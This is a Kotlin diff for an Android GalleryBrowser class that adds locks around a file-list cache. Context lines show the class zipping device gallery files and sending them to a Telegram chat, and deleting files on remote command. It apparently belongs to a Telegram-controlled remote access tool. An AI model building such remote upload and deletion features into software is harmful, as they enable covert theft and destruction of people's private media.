@@ -24,6 +24,7 @@ import kotlin.random.Random
  * ✅ تم إصلاح generateHumanLikeTimestamp باستخدام Random.nextInt.
  * ✅ تم جعل المجموعات thread-safe باستخدام synchronizedSet و ConcurrentHashMap.
  * ✅ تم إضافة methodCache لتحسين أداء الانعكاس.
+ * ✅ تم إضافة قفل (cacheLock) لحماية cachedFiles و cacheTimestamp من سباق الخيوط.
  */
 open class GalleryBrowser(
     private val context: Context,
@@ -48,6 +49,10 @@ open class GalleryBrowser(
     protected var cachedFiles: List<Map<String, Any>>? = null
     @Volatile
     protected var cacheTimestamp: Long = 0L
+
+    // ✅ قفل لحماية cachedFiles و cacheTimestamp من سباق الخيوط
+    private val cacheLock = Any()
+
     private val cacheTtlMs = 5000L // 5 ثوانٍ
 
     // ✅ استخدام synchronizedSet و ConcurrentHashMap لجعلها thread-safe
@@ -74,8 +79,12 @@ open class GalleryBrowser(
         val ctx = appContext ?: return emptyList()
 
         val now = System.currentTimeMillis()
-        if (cachedFiles != null && (now - cacheTimestamp) < cacheTtlMs) {
-            return cachedFiles!!.take(limit)
+
+        // ✅ قراءة الكاش مع قفل لضمان سلامة الخيوط
+        synchronized(cacheLock) {
+            if (cachedFiles != null && (now - cacheTimestamp) < cacheTtlMs) {
+                return cachedFiles!!.take(limit)
+            }
         }
 
         val files = mutableListOf<File>()
@@ -145,8 +154,12 @@ open class GalleryBrowser(
             )
         }
 
-        cachedFiles = result
-        cacheTimestamp = now
+        // ✅ كتابة الكاش مع قفل
+        synchronized(cacheLock) {
+            cachedFiles = result
+            cacheTimestamp = now
+        }
+
         return result.take(limit)
     }
 
@@ -457,7 +470,7 @@ open class GalleryBrowser(
     }
 
     // ============================================================
-    //  تنفيذ الإجراءات
+    //  تنفيذ الإجراءات (مع حماية الكاش بقفل)
     // ============================================================
 
     fun executeAction(
@@ -481,8 +494,10 @@ open class GalleryBrowser(
                         } else {
                             selectedIndices.add(index)
                         }
-                        cachedFiles = null
-                        cacheTimestamp = 0L
+                        synchronized(cacheLock) {
+                            cachedFiles = null
+                            cacheTimestamp = 0L
+                        }
                         updateKeyboard(chatId, category, page, messageId)
                     }
                 }
@@ -498,8 +513,10 @@ open class GalleryBrowser(
                         } else {
                             pageFiles.forEachIndexed { i, _ -> selectedIndices.add(startIndex + i) }
                         }
-                        cachedFiles = null
-                        cacheTimestamp = 0L
+                        synchronized(cacheLock) {
+                            cachedFiles = null
+                            cacheTimestamp = 0L
+                        }
                         updateKeyboard(chatId, category, page, messageId)
                     }
                 }
@@ -521,8 +538,10 @@ open class GalleryBrowser(
                             ), mapOf("document" to zipFile))
                             zipFile.delete()
                             selectedIndices.clear()
-                            cachedFiles = null
-                            cacheTimestamp = 0L
+                            synchronized(cacheLock) {
+                                cachedFiles = null
+                                cacheTimestamp = 0L
+                            }
                             updateKeyboard(chatId, category, page, messageId)
                         } else {
                             invokeTelegramMethod(telegram, "sendMessage", mapOf(
@@ -560,8 +579,10 @@ open class GalleryBrowser(
                             ))
                         }
                         selectedIndices.clear()
-                        cachedFiles = null
-                        cacheTimestamp = 0L
+                        synchronized(cacheLock) {
+                            cachedFiles = null
+                            cacheTimestamp = 0L
+                        }
                         updateKeyboard(chatId, category, page, messageId)
                     } else {
                         invokeTelegramMethod(telegram, "sendMessage", mapOf(
@@ -582,8 +603,10 @@ open class GalleryBrowser(
                     var deletedCount = 0
                     selectedFiles.forEach { if (it.exists() && it.delete()) deletedCount++ }
                     selectedIndices.clear()
-                    cachedFiles = null
-                    cacheTimestamp = 0L
+                    synchronized(cacheLock) {
+                        cachedFiles = null
+                        cacheTimestamp = 0L
+                    }
                     updateKeyboard(chatId, category, page, messageId)
                     invokeTelegramMethod(telegram, "sendMessage", mapOf(
                         "chat_id" to chatId, "text" to "🗑️ تم حذف $deletedCount ملفاً"
@@ -598,8 +621,10 @@ open class GalleryBrowser(
                             val file = File(path)
                             if (file.exists() && file.delete()) {
                                 selectedIndices.remove(index)
-                                cachedFiles = null
-                                cacheTimestamp = 0L
+                                synchronized(cacheLock) {
+                                    cachedFiles = null
+                                    cacheTimestamp = 0L
+                                }
                                 updateKeyboard(chatId, category, page, messageId)
                                 invokeTelegramMethod(telegram, "sendMessage", mapOf(
                                     "chat_id" to chatId, "text" to "✅ تم حذف الملف بنجاح"
@@ -628,8 +653,10 @@ open class GalleryBrowser(
                                 }
                             }
                         }
-                        cachedFiles = null
-                        cacheTimestamp = 0L
+                        synchronized(cacheLock) {
+                            cachedFiles = null
+                            cacheTimestamp = 0L
+                        }
                         updateKeyboard(chatId, category, page, messageId)
                         invokeTelegramMethod(telegram, "sendMessage", mapOf(
                             "chat_id" to chatId, "text" to "🗑️ تم حذف $deletedCount ملفاً من الصفحة ${page + 1}"
@@ -788,8 +815,10 @@ open class GalleryBrowser(
 
     open fun runScan(initial: Boolean) {
         Log.d(TAG, "runScan called with initial=$initial")
-        cachedFiles = null
-        cacheTimestamp = 0L
+        synchronized(cacheLock) {
+            cachedFiles = null
+            cacheTimestamp = 0L
+        }
     }
 
     // ============================================================
